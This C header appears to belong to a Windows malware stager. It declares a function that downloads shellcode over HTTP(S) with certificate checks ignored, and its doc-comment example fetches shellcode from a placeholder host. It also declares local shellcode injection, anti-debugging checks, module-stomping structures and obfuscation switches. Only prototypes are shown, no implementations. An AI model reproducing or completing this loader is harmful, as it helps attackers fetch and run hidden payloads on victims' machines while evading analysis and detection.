#pragma once

#include <windows.h>
#include <winhttp.h>

#include <Macros.h>
#include <Native.hh>
#include <obfuscation/chacha.h>

#ifdef STAGER
#define CONFIG_HOST
#define CONFIG_PORT
#define CONFIG_SECURE
#define CONFIG_USER_AGENT
#define CONFIG_ADD_HEADERS
#endif

#define OBFUSCATION
#define ANTI_ANALYSIS 

/*!
 * @brief
 * Downloads shellcode from a specified server using an HTTP(S) request and returns the response buffer.
 * 
 * @param Host
 * The hostname or IP address of the server from which to download the shellcode.
 * 
 * @param Port
 * Port number to connect to on the server.
 * 
 * @param Path
 * The URL path for the request.
 * 
 * @param Secure
 * If TRUE, establishes a secure (HTTPS) connection; if FALSE, uses HTTP.
 * 
 * @param MethodReq
 * HTTP method to use for the request (e.g., "GET", "POST").
 * 
 * @param UserAgent
 * Optional parameter specifying the User-Agent header for the request. Use NULL for default.
 * 
 * @param HeadersAdds
 * Optional parameter specifying additional HTTP headers to include in the request. Use NULL for none.
 * 
 * @param pBufferRet
 * Pointer to a buffer that will receive the response data. The buffer is allocated within the function, and the caller must free it when done.
 * 
 * @param BufferSzRet
 * Pointer to a variable that receives the size of the downloaded data in bytes.
 * 
 * @return
 * Returns TRUE if the request succeeds and data is received; otherwise, returns FALSE.
 * 
 * @retval TRUE if the data was successfully downloaded and stored in `pBufferRet`.
 * @retval FALSE if there was an error during any part of the request or data reading process.
 * 
 * @note
 * For secure connections, the function sets specific flags to ignore certificate validation errors.
 * 
 * @warning
 * This function allocates memory for the response buffer. The caller is responsible for freeing this memory to avoid memory leaks.
 * 
 * @example
 * @code
 * PBYTE pBuffer;
 * ULONG_PTR BufferSize;
 * if (StagerShellcode(L"example.com", 443, L"/path/to/shellcode", TRUE, L"GET", NULL, NULL, &pBuffer, &BufferSize)) {
 *     // Use pBuffer as needed
 *     LocalFree(pBuffer);
 * }
 * @endcode
 */
BOOL StagerShellcode( 
    _In_     LPCWSTR    Host,
    _In_     INT        Port,
    _In_     LPCWSTR    Path,
    _In_     BOOL       Secure,
    _In_     LPCWSTR    MethodReq,
    _In_opt_ LPCWSTR    UserAgent,
    _In_opt_ LPCWSTR    HeadersAdds,
    _Out_    PBYTE     *pBufferRet,
    _Out_    ULONG_PTR *BufferSzRet
);

/*!
 * 
 */
VOID LocalInjection(
    PVOID  ShellcodeBytes,
    UINT64 ShellcodeSize
);

BOOL IsDbgrPresent( void );

BOOL GlobalFlagCheck( void );

BOOL QueryDbgPortObj( void );

BOOL HwbpCheck( void );

BOOL InitInstance(
    void
);

typedef struct _INSTANCE {
    PTEB Teb;
    struct {
        VOID (*BlackoutMain)( PVOID );
    } Win32;

    DWORD InjectionTechnique;
} INSTANCE, *PINSTANCE;

extern INSTANCE Instance;

typedef struct _STOMP_ARGS {
    PVOID  Backup;
    UINT64 Length;
} STOMP_AGRS, *PSTOMP_ARGS;

typedef VOID (*ShellcodeMain)( PVOID );
